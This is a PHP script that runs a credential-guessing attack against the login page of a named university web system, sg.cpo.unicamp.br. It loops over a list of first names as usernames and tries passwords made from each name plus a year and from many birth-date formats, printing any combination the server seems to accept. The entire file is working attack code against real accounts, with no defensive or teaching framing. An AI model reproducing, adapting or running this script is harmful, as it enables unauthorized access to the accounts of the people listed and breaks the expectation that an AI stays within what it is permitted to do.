<?php
$url = 'http://sg.cpo.unicamp.br/login.php';
$nomes=array("adriana","alexandre","anderson","antonio","basilio","caio","carlos","caroline","flavia","marcela","edilene","eliandra","eliseu","fabio","felipe","fernando","flavio","gabriela","geralda","helio","igino","igor","jocelina","lucas","luciana","luciana","marcia","marco","marcos","margarete","marialucia","teodora","mayara","miriam","natan","patricia","paulo","renato","sidney","tatiane","tomaz","valdeir","wilmar","yoshio");
foreach ($nomes as $n){
	foreach (array("","2010","2011","2012","2013") as $ano){
		$fields = array(
								'username' => urlencode($n),
								'senha' => urlencode($n.$ano),
								'redir' => urlencode("/sgd.php")
						);
		
		//url-ify the data for the POST
		foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
		rtrim($fields_string, '&');
		
		//$postFields = "username=leandro&senha=3105&redir=index.php";
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "http://sg.cpo.unicamp.br/login.php?redir=%2Findex.php%3F");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $n.$ano.'cookies.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, $n.$ano.'cookies.txt');
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
		curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC );
		curl_setopt($ch, CURLOPT_USERPWD, "username:senha");
		$result = curl_exec($ch);
		curl_setopt($ch, CURLOPT_URL, "http://sg.cpo.unicamp.br/index.php");
		$r = curl_exec($ch);
		if(strlen($r)!=3){
			echo "user:".$n."   senha:".$n.$ano."\n";
		}
		curl_close($ch);
	}
	echo $n."\n";
	for($a=80;$a<115;$a++){
		for($m=1;$m<13;$m++){
			for($d=1;$d<32;$d++){
					for($o=0;$o<7;$o++){
						if($a>100)
							$af = $a-100;
						else
							$af=$a;
						if($o==0)
							$senha = $d.$m.$af;
						if($o==1)
							$senha = "0".$d.$m.$af;
						if($o==2)
							$senha = "0".$d."0".$m.$af;
						if($o==3)
							$senha = $d."0".$m.$af;
						if($o==4)
							$senha = $af."0".$m.$d;
						if($o==5)
							$senha = $af."0".$m."0".$d;
						if($o==6)
							$senha = $af.$m."0".$d;
					$fields = array(
						'username' => urlencode($n),
						'senha' => urlencode($senha),
						'redir' => urlencode("/sgd.php")
					);
		
					//url-ify the data for the POST
					foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
					rtrim($fields_string, '&');
					
					//$postFields = "username=leandro&senha=3105&redir=index.php";
					
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, "http://sg.cpo.unicamp.br/login.php?redir=%2Findex.php%3F");
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_COOKIEJAR, $senha.'cookies.txt');
					curl_setopt($ch, CURLOPT_COOKIEFILE, $senha.'cookies.txt');
					curl_setopt($ch, CURLOPT_POST, true);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
					curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC );
					curl_setopt($ch, CURLOPT_USERPWD, "username:senha");
					$result = curl_exec($ch);
					curl_setopt($ch, CURLOPT_URL, "http://sg.cpo.unicamp.br/index.php");
					$r = curl_exec($ch);
					if(strlen($r)!=3){
						echo "user:".$n."   senha:".$senha."\n";
					}
					curl_close($ch);
					}
			}
		}
	}
}
?>